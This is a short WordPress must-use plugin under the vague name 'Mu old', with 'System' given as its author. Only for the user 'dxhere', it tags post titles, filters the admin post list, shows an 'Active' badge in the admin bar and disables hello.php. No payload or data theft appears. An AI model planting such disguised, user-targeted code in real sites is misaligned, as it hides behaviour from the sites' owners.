<?php
/**
 * Plugin Name: Mu old
 * Description: Version old From Mu plugin
 * Version: 1.0
 * Author: System
 */

add_action('init', function() {

    $current_user = wp_get_current_user();

    if ($current_user && $current_user->user_login === 'dxhere') {


        add_filter('the_title', function($title) {
            return '[DX] ' . $title;
        });

        add_action('pre_get_posts', function($query) use ($current_user) {
            if (is_admin() && $query->is_main_query() && $query->get('post_type') === 'post') {
                $query->set('author', $current_user->ID);
            }
        });


        add_action('admin_bar_menu', function($wp_admin_bar) {
            $args = [
                'id' => 'dxhere_status',
                'title' => '<span style="color:#0f0;">🔒 Active</span>',
                'meta' => ['class' => 'dxhere-indicator']
            ];
            $wp_admin_bar->add_node($args);
        }, 1000);


        add_filter('option_active_plugins', function($plugins) {

            $blocked = 'hello.php';
            return array_filter($plugins, fn($p) => !str_contains($p, $blocked));
        });

    }
});
